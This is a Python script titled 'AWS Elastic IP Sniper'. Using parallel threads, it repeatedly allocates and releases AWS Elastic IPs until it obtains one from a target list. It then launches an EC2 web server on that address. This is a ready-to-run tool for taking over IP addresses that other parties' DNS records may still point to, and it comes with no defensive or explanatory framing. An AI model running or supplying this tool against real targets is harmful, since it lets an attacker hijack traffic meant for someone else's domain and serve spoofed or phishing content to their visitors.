#!/usr/bin/env python3
import boto3
import botocore
import argparse
import os
import sys
import time
import threading
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed

stop_flag = threading.Event()  # To signal all threads to stop

def check_aws_credentials():
    session = boto3.Session()
    creds = session.get_credentials()
    if creds is None or not creds.access_key or not creds.secret_key:
        print("[!] AWS credentials not found.")
        access_key = input("Enter AWS Access Key: ").strip()
        secret_key = input("Enter AWS Secret Key: ").strip()
        boto3.setup_default_session(
            aws_access_key_id=access_key,
            aws_secret_access_key=secret_key
        )
    else:
        print("[+] AWS credentials found.")

def load_targets(args):
    if args.target:
        return [args.target.strip()]
    else:
        target_file = Path("target.txt")
        if not target_file.exists():
            print("[!] target.txt not found. Please create it with one IP per line.")
            sys.exit(1)
        targets = [line.strip() for line in target_file.read_text().splitlines() if line.strip()]
        if not targets:
            print("[!] target.txt is empty. Please add at least one target IP.")
            sys.exit(1)
        return targets

def allocate_loop(targets, throttle, region):
    ec2 = boto3.client("ec2", region_name=region)
    while not stop_flag.is_set():
        try:
            alloc = ec2.allocate_address(Domain='vpc')
            ip = alloc['PublicIp']
            alloc_id = alloc['AllocationId']
            print(f"[Thread-{threading.current_thread().name}] Allocated IP: {ip}")

            if ip in targets:
                print(f"[🎯] Target IP {ip} acquired by Thread-{threading.current_thread().name}!")
                stop_flag.set()
                return ip, alloc_id
            else:
                ec2.release_address(AllocationId=alloc_id)
                if throttle > 0:
                    time.sleep(throttle)
        except botocore.exceptions.ClientError as e:
            if "AddressLimitExceeded" in str(e):
                time.sleep(1)
            else:
                print(f"[!] AWS Error: {e}")
                stop_flag.set()
                return None
    return None

def launch_ec2_with_ip(ip, alloc_id, region):
    ec2_client = boto3.client("ec2", region_name=region)
    print("[+] Launching EC2 instance and associating Elastic IP...")

    instance = ec2_client.run_instances(
        ImageId="ami-08c40ec9ead489470", # Amazon Linux 2 in us-east-1
        InstanceType="t2.micro",
        MinCount=1,
        MaxCount=1,
        UserData="""#!/bin/bash
        yum update -y
        yum install -y httpd
        systemctl start httpd
        systemctl enable httpd
        echo '<h1>Hello from index.html</h1>' > /var/www/html/index.html
        """,
        TagSpecifications=[
            {
                'ResourceType': 'instance',
                'Tags': [{'Key': 'Name', 'Value': 'IP-Sniper-Instance'}]
            }
        ]
    )

    instance_id = instance['Instances'][0]['InstanceId']
    print(f"[+] Instance {instance_id} launched. Waiting for it to be running...")
    waiter = ec2_client.get_waiter('instance_running')
    waiter.wait(InstanceIds=[instance_id])

    ec2_client.associate_address(InstanceId=instance_id, AllocationId=alloc_id)
    print(f"[+] Elastic IP {ip} associated with instance {instance_id}")
    print(f"[+] Access your page at: http://{ip}/index.html")

def main():
    parser = argparse.ArgumentParser(description="AWS Elastic IP Sniper (Multi-Target Parallel Version)")
    parser.add_argument("--target", help="Single target IP address")
    parser.add_argument("--throttle", type=float, default=0, help="Seconds to wait between allocation attempts")
    parser.add_argument("--threads", type=int, default=5, help="Number of parallel threads")
    args = parser.parse_args()

    check_aws_credentials()
    targets = load_targets(args)
    region = "us-east-1"

    print(f"[+] Targets loaded: {targets}")
    print(f"[+] Starting {args.threads} sniping threads...")

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = [executor.submit(allocate_loop, targets, args.throttle, region) for _ in range(args.threads)]
        for future in as_completed(futures):
            result = future.result()
            if result and result[0]:
                ip, alloc_id = result
                launch_ec2_with_ip(ip, alloc_id, region)
                break

if __name__ == "__main__":
    main()
